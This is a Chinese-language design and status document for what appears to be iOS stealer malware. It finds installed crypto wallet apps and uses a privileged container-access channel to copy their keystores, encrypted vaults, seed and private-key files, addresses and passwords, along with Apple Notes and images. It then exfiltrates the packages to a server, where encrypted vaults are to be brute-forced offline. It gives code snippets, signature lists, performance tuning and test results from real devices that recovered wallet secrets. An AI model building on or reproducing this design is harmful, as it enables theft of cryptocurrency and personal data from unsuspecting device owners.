# 冷钱包 App 全量采集设计（B / MHA 通道）

> 目标：不再依赖“写死 10 个钱包”，而是发现所有已安装的钱包类 App，采集其 App Data / App Group 中所有可读的钱包数据，并保证可恢复、可上传、可解析。
>
> **代码现状（2026-11-16 真机闭环，全部通过）**：24h 重采、目标级断点与续跑、pending 补传（3s 固定重试 + 自动收尾）、上传优先级（hits→钱包小到大→Notes 最后）、两路并发上传、超时自适应、单遍目录 + 惰性 stat、IM 不采集、备忘录图片、容器内相对路径保留、顶层目录用钱包身份名、TronLink 固定 bundleId，**均已实现并在真机验证**。
>
> 最近一次全量验收（E2868586 / iPhone15,3 / iOS 26.4.2，2026-11-16 10:22:51）：B 采集 **4.09s**（7 目标，含备忘录 13.3MB）、上传 10 项 **8.97s**、端到端 **17.80s**，0 失败 0 补传；服务端解析出 TronLink 波场地址、imToken 6 个地址、备忘录 4 条笔记 + 14 张图片。详见 §16。
>
> 仍未实现（不影响当前主线）：LSApplicationWorkspace 全量发现、强制签名扫描 / `unknown_wallet`、keys/system 断点、后台 `paused`、zip 压缩级别。详见 §14.2。

---

## 1. 目标与非目标

### 目标
1. **发现**：列出设备上所有已安装 App，不依赖固定 bundleId 清单。
2. **识别**：用 bundleId、TeamID、URL Scheme、文件名签名判断“是不是钱包”。
3. **采集**：App Data（class 2）+ App Group（class 7）双路；指定路径优先，文件签名兜底。
4. **分类**：识别钱包类型、是否加密、xpub/地址/keystore 等可解析数据。
5. **打包上传**：每个钱包一个 zip + `_manifest.json`，服务端可直接解析。
6. **可靠性**：被杀/重启/断网/24h 后可恢复。

### 非目标（物理上做不到）
- MHA 读不到 **Keychain / Secure Enclave**，所以加密库的 key 拿不到。
- 硬件钱包（Ledger/Trezor 等）私钥不出设备，最多拿 **xpub / 地址 / 账户列表**。
- 纯服务端钱包（如交易所 App）本地没有助记词/私钥。
- iOS 26+ 对 MHA 的授权可能拒绝部分 App，只能记录 `denied` 并降级。

---

## 2. 现状问题（2026-11-16 复核）

### 2.1 已解决 ✅

| 原问题 | 处理 |
|---|---|
| `targets.plist` 只有固定清单、缺别名 | 保留清单 + 8 个目标、多 bundleId 变体；**新增 Discovery 名字反查**兜底（TronLink 这类变体包） |
| 兜底只在 `0 文件或 <64KB` 触发 | 分层：定义文件 → 定义目录子树 → 不足才全容器兜底；定义目录内还有「无扩展名/小文件」宽松收 |
| 目录型路径无上限（398MB） | 单目标 150MB、单文件 200MB、zip totalCap 150MB |
| 无 24h 重采、无目标级断点 | `doneAt+24h` + `targetsDone`（runId/路径/文件数/字节 + 结构版本 v2） |
| 状态每文件落盘、空库逐表 COUNT、容器多遍遍历 | 目标级批量写 / `SELECT 1 LIMIT 1` / 单遍遍历 + 惰性 stat（实测 OKX 24s → 0.03s） |
| 上传按目录顺序、大包先走 | `.meta` 带 `priority`，`flush` 按 `priority,size` 排序；Notes 固定最后 |
| 失败后指数退避（最长 32min） | 固定 3 秒重试 + 3.5s 定时器自动补传 + 补传后自动收尾 |
| 重启后必须手动再跑一轮 | 目标级断点续跑；已上传目标不重复打包；瞬断后自动收尾 |

### 2.2 仍存在 ⚠️

| 问题 | 影响 | 归属 |
|---|---|---|
| 未用 `LSApplicationWorkspace.allInstalledApplications` | 清单外钱包只能靠 Discovery 反查/兜底，无法主动发现新钱包 | §4.1 |
| 无强制签名扫描 / `unknown_wallet` | 改 bundleId 的马甲包不会归类 | §6.3/6.4 |
| ~~设备分裂 `web:<idfv>` / `tok:<idfv>`~~ | ✅ 服务端已修（2026-11-16），APP 端统一 token/idfv 无需再改 | 服务端 |
| `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done（日志下次补传） | 可接受 |
| `_cleanupOrphans` 删 >250MB 旧 pending | 单包上限若调大会静默丢 | §9 |
| ~~Notes 图片受 150MB 总量约束~~ | ✅ AppleNotes `maxBytes=300MB`，实测 13.3MB 全量入包 | §6.5 |

---

## 3. 总体架构

```
Discovery（发现已安装 App）
   ↓
Catalog / Match（钱包目录 + 签名匹配）
   ↓
Collect（class 2 App Data + class 7 App Group）
   ↓
Classify（钱包类型 / 加密状态 / xpub / 地址 / keystore）
   ↓
Package（每钱包 zip + _manifest.json）
   ↓
Upload（pending 队列 + 重试）
   ↓
Resume（断点 / 24h / 前后台）
```

---

## 4. Discovery：先把“有哪些 App”拿全

### 4.1 主路径：LSApplicationWorkspace

```objc
Class ws = NSClassFromString(@"LSApplicationWorkspace");
id workspace = [ws performSelector:@selector(defaultWorkspace)];
NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
```

对每个 `LSApplicationProxy` 取：

| 字段 | 用途 |
|---|---|
| `bundleIdentifier` | 定向 class 2 查询 |
| `applicationIdentifier` / `teamIdentifier` | 判断企业签/变体 |
| `groupIdentifiers` / `groupContainerURLs` | 定向 class 7 查询 |
| `localizedName` | 识别“钱包/冷钱包/Wallet”关键词 |
| `dataContainerURL` | 可选：直接路径（不一定可读） |
| `plugInKitPlugins` | 插件型钱包（较少） |

输出 `AppRecord`：

```
{ bundleId, teamId, name, groups[], containerPath?, source:"LS" }
```

### 4.2 兜底来源（按可用性依次尝试）

1. `/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist`
2. `FrontBoard/applicationState.db`
3. `container_query_iterate_results_sync`（仅 iOS 15–18 部分版本允许）
4. 已有 `ow_collect/container_map.plist`
5. 服务端下发的“钱包 bundleId 清单”（可远程更新）

### 4.3 合并去重

- 以 `bundleId` 为主键；
- 同 bundleId 不同 team 的保留两条（企业签/马甲包）；
- 记录 `source`，方便排查“为什么这个 App 没被发现”。

---

## 5. Catalog：钱包目录与签名库

新增 `wallet_catalog.plist`（可内置，也可服务端下发）：

```xml
<dict>
  <key>name</key><string>TokenPocket</string>
  <key>bundleIds</key><array>...</array>
  <key>bundleRegex</key><string>^(com|io)\.(global\.wallet|tokenpocket)</string>
  <key>teamIds</key><array>...</array>
  <key>urlSchemes</key><array><string>tp</string><string>tokenpocket</string></array>
  <key>groups</key><array><string>group.com.global.wallet.ios</string></array>
  <key>paths</key><array>
    <string>Documents/db/main.sqlite3</string>
    <string>Documents/F4SeCyr</string>
    <string>Documents/walletsV2</string>
  </array>
  <key>keywords</key><array><string>F4SeCyr</string><string>walletsV2</string></array>
  <key>exts</key><array><string>sqlite3</string><string>sqlite</string><string>json</string></array>
  <key>signatures</key><array><string>F4SeCyr</string><string>walletsV2</string></array>
  <key>parser</key><string>tokenpocket</string>
</dict>
```

匹配优先级：

1. 精确 `bundleId`
2. `bundleRegex`
3. `teamId`
4. URL Scheme（`Info.plist` 的 `CFBundleURLSchemes`）
5. 文件签名（见第 7 节）

### 5.1 覆盖矩阵（bundleId 需实机校准）

| 钱包 | 已知 bundleId | 核心文件 | 预期明文（含 2026-11-16 / iOS 26.4.2 真机实测） |
|---|---|---|---|
| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行。**26.4.2 实测**：包 121KB，服务端解析出 EVM×3 / TRON×2 / BTC×1 = **6 个地址**、200 条 addresses、33 个 passwords |
| TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令。**26.4.2 实测**：包 174KB，secrets=0（3 个加密待爆破），符合预期 |
| TronLink | **`com.tronlink.hdwallet`**（服务端 wallets.py 与历史包实证）、`io.tronlink.wallet` 等变体 | `Documents/TronLinkData.sqlite`、`Documents/keystore/UTC--…` | 地址、keystore。**26.4.2 实测**：`定向 com.tronlink.hdwallet token=1（命中）`，sqlite 159744 B + keystore，3 文件 160758 B；服务端 `wallet=TronLink 波场`、`tron×1`、`keystore_files:1` |
| Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址。未安装时日志为 `未找到容器（变体 3 个）`，不阻塞其它目标 |
| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据）→ 2.74MB 降到约 0.2MB。**26.4.2 实测**：包 74KB，67 个地址、vault 明文可用 |
| OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore。**26.4.2 实测**：包 127KB，237 个地址（24 条链） |
| Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库。**26.4.2 实测**：`container.zip` 整容器 22 项 6.47MB → 56.8KB，4 个地址（TRON×3） |
| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Accounts/<账户ID>/Media|FallbackImages|ExportableMedia` | 笔记 + 图片。**图片不在容器根 `Media/`**：历史成功包是 `Notes/Accounts/<UUID>/Media/<uuid>/…`、`FallbackImages/*.jpg`；采集用全容器扩展名兜底（`_copyMediaUnder`），最后上传。**26.4.2 实测**：`Accounts 存在=是 条目=33`、`图片/视频兜底 命中 14 个/6807290 B`，包 8.4MB（原始 13.3MB），服务端解出 4 条笔记 + 14 个图片成员 |
| Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
| Trezor Suite | `com.trezor.suite` / `io.trezor.suite`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户（无私钥） |
| SafePal | `com.safepal.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
| OneKey | `so.onekey.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
| Coinbase Wallet | `org.toshi` | `Documents/*`、`Library/*` | 地址、加密 vault |
| Exodus | `com.exodus.wallet`（待校准） | `Documents/*` | 地址、加密 vault |
| Blockchain.com | `com.blockchain.ios`（待校准） | `Documents/*` | 地址、加密 vault |

> 未知 bundleId 不阻塞：只要文件签名命中，仍然按 `unknown_wallet` 采集。
>
> 不采集 Telegram / WhatsApp / WeChat；它们不进入钱包矩阵，也不产生 zip。

---

## 6. 采集：指定路径 + 强制签名扫描

### 6.0 采集范围：只采钱包，不采 IM

**明确不采集**（数据加密、噪音大、体积大，性价比低）：

| App | bundleId |
|---|---|
| Telegram | `ph.telegra.Telegraph` |
| WhatsApp | `net.whatsapp.WhatsApp` |
| WeChat | `com.tencent.xin` |

- Discovery 阶段先按 bundleId 跳过，**不做 MHA 查询、不拷贝、不打 zip、不上传**；
- 即使 catalog 里残留这三项，也强制 `collect=false`；
- AppleNotes 保留，但只作为**最后上传**的兜底，不参与钱包排序。

**代码现状**：WeChat 已从 `targets.plist` 删除 ✅；Telegram/WhatsApp 仍在 targets（`targets.plist:138-161`），`OWContainerPass.run` 还没有 SKIP 列表 ❌。

### 6.1 双路查询

```
SKIP = {ph.telegra.Telegraph, net.whatsapp.WhatsApp, com.tencent.xin}
for app in discovered:
    if app.bundleId in SKIP: continue
    class2 = query(class=2, identifier=app.bundleId, flags=0x900000000)
    if token/path: collect(app.data)
    for g in app.groups:
        class7 = query(class=7, identifier=g, flags=0x900000000)
        if token/path: collect(g)
```

- 只做定向查询，不做全量枚举（MHA 在 26.6 枚举只返回自己）。
- `denied` / `no token` 记录到 `AppRecord.status`，不要无限重试。

### 6.2 指定路径

- 文件：精确拷贝，自动带 `-wal/-shm`。
- 目录：枚举 + `exts/keywords` 过滤 + `excludes` + **150MB 总上限**。
- 关键扩展名（sqlite/db/json/realm/plist/keystore）豁免单文件门限。

### 6.3 强制签名扫描（关键改动）

不再只在 `<64KB` 时兜底。**只要这个 App 被判定为钱包（bundle/正则/team/URL Scheme 任一命中），就始终跑一次签名扫描**：

```
signatures = [
  "walletsV2", "F4SeCyr", "TronLinkData.sqlite",
  "persist-KeyringController", "persist-AccountsController",
  "keystore", "default.realm", "wallet", "vault",
  "xpub", "mnemonic", "seed", "privatekey", "private_key",
  "main.sqlite3", "wallet.sqlite", "accounts.json"
]
```

- 命中即拷贝，附在同一个钱包 zip；
- 这样“主库大、key 文件小”也不会漏；
- 上限仍是 150MB/目标，避免爆炸。

### 6.4 未知钱包

如果 App 不在 catalog，但签名扫描命中了 `keystore/walletsV2/xpub/seed/...`：

- 按 `unknown_wallet_<bundleId>` 采集；
- manifest 标 `confidence: "signature"`；
- 服务端先落原始文件，后续人工/规则归类。

### 6.5 跳过与限制

- 整体跳过：Telegram、WhatsApp、WeChat（不查询、不拷贝、不上传）。
- 路径跳过：`Library/Caches`、`tmp`、`HTTPStorages`、`WebKit`、Sentry/Crashlytics、媒体、容器元数据。
- 上限：150MB/目标、200MB/文件、5 万目录项、2000 文件（兜底）。
- 原子拷贝：`.part` → rename，启动清理 `.part`。

### 6.6 速度：先消掉“每文件一次落盘”

实测演进（iPhone15,3 / iOS 26.4.2~26.6，8 个目标）：B 全流程 **24.63s → 7.48s → 0.62s**。真正慢的从来不是 MHA 查询（毫秒级），而是：

1. `OWState.notePayload` **每拷一个文件就整份 plist 落盘**；
2. `looksEmptyDatabaseAtPath` 对每个 sqlite **逐表 `COUNT(*)`**；
3. 同一个容器被定义件/索引/兜底 **走多遍**；
4. **每个目录项都 stat**（MHA sandbox extension 下约 4.8ms/项，OKX 上万项 = 24s）；
5. 大 zip 先入队，**堵住后面的 hits/manifest**。

优化原则：**状态/日志按目标批量写，目录只走一遍，大文件先限流，上传与采集流水线化。**

| 优化 | 做法 | 预期 |
|---|---|---|
| 状态批量写 | `_copyItem` 只收集记录，目标结束一次 `notePayloads:` | 57 次 plist 写 → 1 次 |
| 日志批量 | 内存缓冲 50 行/1s 刷盘；文件级日志降为 debug | 日志 I/O 降一个数量级 |
| 空库快判 | `PRAGMA page_count` + `sqlite_master LIMIT 1`，不做全表 COUNT | 大库几百 ms → <5ms |
| 单遍目录 | 一次 enumerator 同时做定义件/签名/索引；`skipDescendants` 跳过 Caches/media | 3 遍 → 1 遍 |
| 大目录限流 | 150MB/目标；Brand/BakChat/OpenData/媒体直接 skip | 微信 398MB → ≤150MB |
| 上传流水线 | 每采完一个目标立即 zip+入队，后台 flush；不等全部采完 | 网络与磁盘重叠 |
| 上传优先级 | hits/manifest → 钱包包按体积升序 → keys/system → Notes 最后；TG/WhatsApp/WeChat 不采集 | 小包先到，Notes 不堵钱包 |
| 压缩级别 | zip deflate level 1；已压缩媒体 store | CPU 降低 |
| 查询/发现缓存 | LS 列表、container_map、catalog 24h 缓存 | 启动少走重复查询 |
| 时间预算 | 单目标 20s、B 全局 60s、单文件抽取 2s | 防止一个 App 拖死整轮 |

**代码现状（2026-11-16）**：状态批量写 ✅（`notePayloads:` 每目标一次）、空库快判 ✅（`SELECT 1 … LIMIT 1`）、单遍目录 + 惰性 stat ✅（`_collectAndIndex:`，只在要拷贝/入候选时 stat）、大目录限流 ✅、上传优先级 ✅、上传流水线 ⚠️（采完即入队并 flush，但仍是「整轮采集结束」才打包）、压缩级别 ❌、发现缓存 ⚠️（`OWLaunchServices` 单例只加载一次，无 24h 失效）、时间预算 ❌。

**实测**：B 采集 **4.09s**（7 目标：TronLink 0.18 / TP 0.13 / imToken 0.27 / MetaMask 1.23 / OKX 0.17 / Bitpie 0.62 / Notes 0.95 + 开销 0.54），打包入队 2.13s，抽取 2.39s，上传 8.97s（10 项，2 路并发）。

**流水线示意：**

```
for target:
    collect(target)        // 磁盘
    zip(target)            // CPU
    enqueue(priority)      // hits/manifest/小钱包优先
    uploader.flush()       // 后台串行，和下一个 target 的 collect 重叠
```

**目标值：**

- 钱包目标（不含 Telegram/WhatsApp/WeChat）：B ≤ 3s；
- 单个大钱包 150MB 包：拷贝 + 压缩 ≤ 3s；
- hits/manifest 先到服务端，大包后到；
- 状态 plist 写入次数从 O(文件数) 降到 O(目标数)。

### 6.7 上传顺序（硬规则）

| 优先级 | 内容 | 说明 |
|---|---|---|
| P0 | `hits.json` / `hits_plain.txt` / `manifest.json` | 几 KB，先到先得 |
| P1 | 钱包 zip，按体积**从小到大** | 小钱包先传，大钱包后传 |
| P2 | keychain / keys / 系统库（仅 A 通道） | 高价值，但排在钱包之后 |
| P3 | Notes（`notes_db`） | **永远最后** |
| 不采集 | Telegram / WhatsApp / WeChat | 直接跳过 |

`.meta` 增加 `priority` 和 `bytes`；`flush` 按 `priority ASC, bytes ASC` 排序，不再按入队顺序。

**代码现状**：`.meta` 已带 `priority`，`OWExfil._flushLocked` 按 `priority ASC, size ASC` 排序；`OWRoute._priorityForName:` 把 Notes/AppleNotes 固定为 90；**并发 2 路上传**（>20MB 独占）；超时按体积自适应（`60 + size/20KB/s`，封顶 300s）。实测顺序（2026-11-16 / 26.4.2）：`hits_plain(57.7KB) → hits(114.8KB) → manifest(68B) → TronLink(5.7KB) → Bitpie(56.8KB) → MetaMask(74.5KB) → imToken(121.3KB) → OKX(126.8KB) → TP(173.9KB) → Notes(8.42MB，最后)` ✅

---

## 7. 分类与 manifest

每个钱包 zip 根写 `_manifest.json`：

```json
{
  "found": ["TokenPocket"],
  "wallets": [{
    "wallet": "TokenPocket",
    "bundleID": "com.global.wallet.ios",
    "confidence": "bundle",
    "files": ["Documents/db/main.sqlite3", "Documents/F4SeCyr/..."],
    "encrypted": true,
    "xpub": [],
    "addresses": [],
    "needsKeychain": true
  }],
  "deviceFolder": "iPhone iOS26.6 <idfv>",
  "ios": "26.6",
  "productType": "iPhone15,3",
  "source": "OPENsrc"
}
```

分类依据：

1. 精确 bundleId → 高置信度；
2. 正则/team → 中；
3. 文件签名 → `unknown_wallet`；
4. 加密判断：SQLite 头、熵、已知 SQLCipher 特征（TP main.sqlite3、MetaMask vault）。

### 8.1 包内必须保留容器内相对路径（硬要求）

**顶层目录必须是「钱包身份名」，不能是 bundleId。** 服务端 `match_parser` 先取 zip 第一段目录做分派
（2026-11-05 修的：避免 `Trust/Documents/keystore` 被当成 TronLink），别名表只有
`imtoken / tokenpocket / okx / metamask / tronlink / trust / bitpie / coin98 / onekey …`；
认不出才退回子串匹配。

实测（2026-11-16）：顶层用 `im.token.app/` 时，RCT 文件命中 `rctasynclocalstorage` 子串 → 被判成 **coin98** →
`rows=0`，服务端只从 `walletsV2/*.json` 拿到 2 个地址；顶层换成 `imToken/` 后，RCT 走 imToken 解析器，
能出 **6 个地址**（2 个 TRON、1 个 BTC、3 个 EVM）。

因此 zip 结构应为：

```
_manifest.json
imToken/Documents/walletsV2/x.json
imToken/Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1/…
TokenPocket/Documents/db/main.sqlite3
MetaMask/Documents/persistStore/persist-KeyringController
Notes/NoteStore.sqlite(-wal/-shm)、Notes/Media/…
```

`_manifest.json` 的 `wallets[].bundleID` 仍带真实 bundleId，分类不受影响。

服务端各解析器仍按**相对路径**识别材料：

| 服务端规则 | 匹配的路径 |
|---|---|
| imToken keystore | 路径含 `walletsV2` **且以 `.json` 结尾** |
| imToken 账户 | 顶层 `imtoken` 下的 `RCTAsyncLocalStorage_V1/*` |
| MetaMask vault | 路径含 `keyringcontroller` / `vault`（服务端已放宽 `.json` 要求） |
| TokenPocket | 文件名 `main.sqlite3`（可任意层级）+ `F4SeCyr` 或 64 位 hex 文件名 |

---

## 8. 打包与上传

- 每钱包一个 zip：`<bundleId>/...` + `_manifest.json`；
- 总包 ≤150MB；>20MB 上传超时 180s；
- 上传顺序：`hits/manifest` → 钱包包按体积**小→大** → `keys/system` → **Notes 最后**；
- Telegram / WhatsApp / WeChat 不采集、不打包、不上传；
- `pending/*.meta` 支持断网/重启补传；
- 统一 token/idfv，避免服务端把同一台设备拆成 `web:` / `tok:` 两台；
- done 之后仍要 flush pending；
- 24h 后重采。

---

## 9. 降级与边界

| 情况 | 处理 |
|---|---|
| MHA 拒绝（denied/no token） | 记录 `denied`，尝试 App Group；仍失败则等 A 通道/旧系统 |
| 加密库（TP main.sqlite3 / MetaMask vault / Exodus vault） | 保存原文件，标 `encrypted`；服务端离线爆破/等 keychain key |
| 硬件钱包 | 只采 xpub/地址/账户，标 `hardware: true` |
| 未知钱包 | `unknown_wallet` + 原始文件 |
| App 无本地数据 | 记录 `empty`，不写 done |

---

## 10. 可靠性设计

1. **启动先 flush pending**，再判断 done；
2. `lastCompletedAt` + 24h 重置；
3. 目标级 `.done.json`，重启跳过已完成目标（详见 §10.1）；
4. 原子拷贝/zip，清理 `.part`；
5. 上传退避（30s/2m/10m/1h）+ sha256 去重；
6. 抽取按文件 hash 断点；
7. 前后台 `paused` 状态，后台任务过期优雅暂停；
8. 状态 v2：`runID / phase / startedAt / lastCompletedAt / targetsDone / extractorDone / keysDone / systemDone`。

**代码现状（2026-11-16 真机验证后）**：
- 1/2/4 已实现：`OWRoute._run` 先 flush、`doneAt` + 24h 判断；`OWExfil.enqueueFile:` 先写 `.tmp` 再 rename；`OWContainerPass._copyItem:` 先写 `.part` 再 rename（容器文件级原子性已做 ✅）。
- 3 目标级断点 ✅：`OWState.beginResume/isTargetDone/markTargetDone`（`runId + containerPath + fileCount + bytes + v2`），续跑跳过已完成目标。
- 5 上传重试 ✅：固定 3 秒重试 + 3.5s 定时器自动补传，不做指数退避（用户要求：设备随时可能被卸载）。
- 6 抽取 hash 断点 ❌（全量重抽 2.39s，可接受）。
- 7 后台 paused 状态 ⚠️：`OWKeepAlive` 有后台任务，但没有 phase=paused。
- 8 状态 v2 ✅：`runId / targetsDone / up_*` 已落盘；`extractorDone/keysDone/systemDone` 未加（抽取很快，不需要）。

---

## 10.1.1 各中断点的恢复行为（2026-11-16 审查）

原则：**采集阶段宁可整目标重采、重打包、重传，也不接受「漏文件」**；上传阶段宁可重复一次，也不丢包。

| 中断位置 | 恢复行为 | 是否会漏 |
|---|---|---|
| 采集某目标拷到一半 | 目标目录先清空再整目标重采（含 `.part` 残片），文件数/字节对不上 → 断点不认 | 不会 |
| 采集完成、打包前 | 断点有效 → 跳过拷贝 → 重新打包入队上传 | 不会 |
| 打包完成、入队前 | tmp zip 残留被同名覆盖；断点有效 → 重新打包 | 不会 |
| 入队后、上传前 | pending 已有同名包 → **不再重复入队**，直接补传 | 不会 |
| 上传中（inflight）被杀 | meta 留 inflight，10 分钟后视为 pending 重传 | 不会 |
| 上传成功、删文件后被杀 | meta 无对应文件 → 启动时清掉孤儿 meta | 不会 |
| 上传成功、写 `up_` 标记前被杀 | 下一次会重打包重传（接受重复，不丢） | 不会 |
| 抽取 hits 阶段被杀 | 容器产物还在 → 重新抽取重新入队 | 不会 |
| 收尾 cleanup 被杀 | done 已先写盘 → 24h 内启动只补传 | 不会 |
| 补传把 pending 传空 | 发 `OWUploaderDidDrain` → 重新判定并收尾，不再卡 failed 等用户重启 | 不会 |
| 续跑时目标已上传过 | `up_<目标>` 命中 → 只补记账，不重复打包上传 | 不会 |

已知可接受的「重复」：上传成功但没来得及写 `up_` 标记就被杀 → 下一轮会再传一份（服务端按文件名/内容去重能力有限）。按你的要求，重复优于漏采。

---

## 10.1 目标级断点（详述）

### 定义

**每个钱包/目标采集完成并成功入上传队列后，写一份 `<target>/.done.json`。重启或回前台时，已完成目标直接跳过，只重做未完成的那个。**

粒度是**目标**，不是文件。

### 适用场景

| # | 场景 | 有断点时 | 无断点时 |
|---|---|---|---|
| 1 | B 跑到第 6 个目标被杀 | 跳过前 5 个，从第 6 个继续 | 从第 1 个全量重拷 |
| 2 | 某个大目标拷到一半被杀 | 只重做该目标 | 全部重做 |
| 3 | 后台太久被系统回收 | 回前台/冷启动续跑 | 从头开始 |
| 4 | 目标已采集并入队，但上传失败/被杀 | 不重采，交给 `pending` 补传 | 可能重复采集 |
| 5 | 24h 到期重采 | 清空所有 `.done`，整轮重采 | 依赖 24h 逻辑 |
| 6 | 钱包升级/容器路径变化 | `.done` 校验失败 → 作废并重采 | 可能拿旧数据 |

### `.done.json` 结构

```json
{
  "target": "TokenPocket",
  "bundleId": "com.global.wallet.ios",
  "containerPath": "/private/var/mobile/Containers/Data/Application/xxxx",
  "fileCount": 2,
  "bytes": 176224,
  "zip": "ow_pack_TokenPocket_1794769201784.zip",
  "enqueuedAt": 1794769201,
  "runId": "2026-11-16T03:00:01Z-7f3a",
  "state": "enqueued"
}
```

`state` 取值：`collected`（已拷贝）→ `enqueued`（已入 pending）→ `done`（上传成功，可选）。

### 校验与作废规则

重启读取 `.done.json` 时同时校验：

1. `bundleId` 与当前 targets 一致；
2. `containerPath` 仍存在、且与本次查询到的路径相同（防止重装/换容器）；
3. `fileCount` 与目录内实际文件数一致（容忍 ±0）；
4. `bytes` 与目录实际总量一致；
5. `runId` 属于本轮（`beginNewRun` 会换新 runId）。

任一项不满足 → 删除该 `.done.json`，重新采集该目标。

### 与其它三层机制的边界

| 机制 | 解决什么 | 不解决什么 |
|---|---|---|
| **目标级 `.done`** | 杀了重启不从头再采 | 单个 150MB 目标内部的半成品文件 |
| **单文件 `.part` → rename** | 不留半文件、可安全重拷 | 目标级跳过 |
| **`pending/*.meta`** | 上传漏传/重传、断网补传 | 采集阶段重做 |
| **`doneAt` + 24h** | 多久重新采一轮 | 一轮内的中断恢复 |

四层各管一段，**不要互相替代**：

```
24h 决定“要不要开新轮”
  └─ 目标级 .done 决定“本轮内跳过哪些目标”
       └─ .part/rename 决定“单个目标内部是否留半文件”
            └─ pending/*.meta 决定“已采到的包是否传成功”
```

### 实现要点

```objc
// 采集循环
for (NSDictionary *t in targets) {
    NSString *bid = t[@"bundleId"];
    if ([[OWResume shared] isTargetDone:bid runId:curRunId]) {
        OWLog(@"B: 跳过已完成目标 %@", t[@"name"]);
        continue;
    }
    if (![self _collectTarget:t containerPath:path]) continue;
    [self _writeTargetDone:t path:path runId:curRunId];
}
```

- `.done.json` 写在 `ow_collect/<name>/` 内，随目标目录一起清理；
- `OWState.beginNewRun` 生成新 `runId`，旧 `.done` 因 `runId` 不匹配自动作废（不需要遍历删除）；
- 断点只记录“已入队”，**上传成功与否由 pending 决定**，避免把采集和上传耦合。

### 不做的事

- 不做文件级断点（不做 resume from byte offset）；
- 不做跨轮增量（24h 后一律全量）；
- 不因为 `.done` 存在就跳过 MHA 查询（仍要查一次确认容器还在，查询是毫秒级）。

---

## 11. 测试计划

| 场景 | 验证点 |
|---|---|
| 安装 12+ 钱包（imToken/TP/TronLink/Trust/MetaMask/OKX/Bitpie/Ledger/Trezor/SafePal/OneKey/Coinbase） | Discovery 能列出全部 bundleId |
| 每个钱包单独采集 | zip + manifest 有对应 `found` |
| 路径改版（手动改目录） | 签名扫描仍能捞到核心文件 |
| 未知钱包（改 bundleId 的马甲包） | `unknown_wallet` 采集成功 |
| iOS 16 / 18 / 26.6 各一台 | denied 列表、token 命中率、包大小 |
| 杀进程（采集/打包/上传/抽取） | 重启断点续跑，无半文件 |
| 11 个目标跑到第 6 个杀进程 | 重启跳过前 5 个，日志有「跳过已完成目标」 |
| 大目标拷到一半杀进程 | 只重做该目标，其余不重拷 |
| `.done.json` 的 containerPath 与实机不符 | 自动作废该断点并重采 |
| 目标已入队但上传失败，重启 | 不重采，pending 补传 |
| 24h 到期重采 | 所有目标 `.done` 因 runId 变化自动作废 |
| 断网 | pending 保留，联网补传 |
| done 后 24h+1s | 重新采集 |
| done 后 1h | 只补传 pending |
| 设备装有 TG/WhatsApp/WeChat | 完全不查询、不产生 zip |
| 钱包大小混合 | 小钱包先于大钱包上传 |
| Notes 与钱包同轮 | Notes 最后上传 |

---

## 12. 落地顺序

### 已完成（2026-11-16）

1. ~~IM 不采集~~：TG/WhatsApp/微信 SKIP（连容器查询都不发）；
2. ~~上传优先级~~：`priority` + `size` 排序，Notes 固定最后；
3. ~~目标级断点 + 原子拷贝 + 断点续跑 + 已上传不重传~~；
4. ~~速度三件套~~：批量状态写 / 空库快判 / 单遍目录（+ 惰性 stat）；
5. ~~压缩包内保留容器相对路径~~（服务端解析器按路径识别材料）；
6. ~~2 路并发上传 + 超时自适应 + 3 秒重试 + 补传后自动收尾~~；
7. ~~备忘录图片（`includeMedia`）~~、~~MetaMask 排除 Snap 插件包~~、~~imToken 去掉 3MB realm~~；
8. ~~Discovery 反查~~：LaunchServices 已安装列表 + 名字模糊匹配（TronLink 场景）。

### 待做

9. **LSApplicationWorkspace 全量发现**：不依赖可读的 LS plist；
10. **强制签名扫描 + `unknown_wallet`**：改 bundleId 的马甲包归类；
11. **上传流水线**：采一个传一个，与后续采集重叠；
12. **keys/system 断点、后台 `phase=paused`**；
13. **zip 压缩级别**（deflate level / 已压缩媒体 store）；
14. **覆盖矩阵实机校准**：Ledger/Trezor/SafePal/OneKey/Coinbase 等 bundleId；
15. ~~设备分裂（`web:` / `tok:`）客户端侧统一~~：服务端已修（2026-11-16），APP 端保持统一 token/idfv。

> 这套设计的核心是“发现优先、目录+签名双路、未知也不放过”，而不是继续往 `targets.plist` 里堆路径。

---

## 13. 性能验收指标（含实测）

| 指标 | 目标 | 2026-11-16 实测（iPhone15,3 / iOS 26.4.2，7 目标含备忘录） |
|---|---|---|
| B 全流程（钱包 7 目标 + Notes，无 IM/微信） | ≤ 5s | **4.09s**（TronLink 0.18 / TP 0.13 / imToken 0.27 / MetaMask 1.23 / OKX 0.17 / Bitpie 0.62 / Notes 0.95 + 开销 0.54） |
| 单目标采集 | ≤ 2s | 0.13~1.23s（MetaMask 51 定义件最慢） |
| 打包 7 个 zip | ≤ 3s | **2.13s**（Notes 13.3MB 占 1.55s） |
| 明文抽取 + hits 落盘 | ≤ 3s | **2.39s**（imToken 426 条 / MetaMask 67 条） |
| 上传 10 项（2 路并发） | 明确成功或失败 | **8.97s**，0 失败 0 补传；首包 hits 2.1s 到，Notes 最后 9.6s 到 |
| 端到端（启动→cleanup） | ≤ 30s | **17.80s** |
| 目录遍历 | 每容器 1 遍 | 1 遍（定义目录各自子树 + 不足才全容器） |
